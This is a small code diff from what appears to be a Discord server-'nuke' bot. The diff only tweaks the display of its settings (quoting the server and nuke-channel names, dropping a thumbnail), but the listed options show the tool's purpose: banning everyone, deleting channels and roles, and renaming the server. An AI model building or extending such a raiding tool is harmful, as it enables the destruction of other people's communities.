@@ -523,13 +523,12 @@ Ban Everyone: {user_volume_settings["ban"]}
 Delete Channels: {user_volume_settings["channels"]}
 Delete Roles: {user_volume_settings["roles"]}
 Edit Server: {user_volume_settings["server"][0]}
-Server Name: {user_volume_settings["server"][1]}
+Server Name: "{user_volume_settings["server"][1]}"
 Server Icon: {user_volume_settings["server"][2]}
 Create Nuke Channel: {user_volume_settings["nuke_channel"][0]}
-Nuke Channel Name: {user_volume_settings["nuke_channel"][1]}
+Nuke Channel Name: "{user_volume_settings["nuke_channel"][1]}"
 '''.removeprefix("\n"))
     embed.set_author(name=ctx.message.author.name, icon_url=f"https://cdn.discordapp.com/avatars/{ctx.message.author.id}/{ctx.message.author.avatar}.png")
-    embed.set_thumbnail(url=user_volume_settings["server"][2])
     await ctx.send(embed=embed)
 
 @bot.command(name="volume")
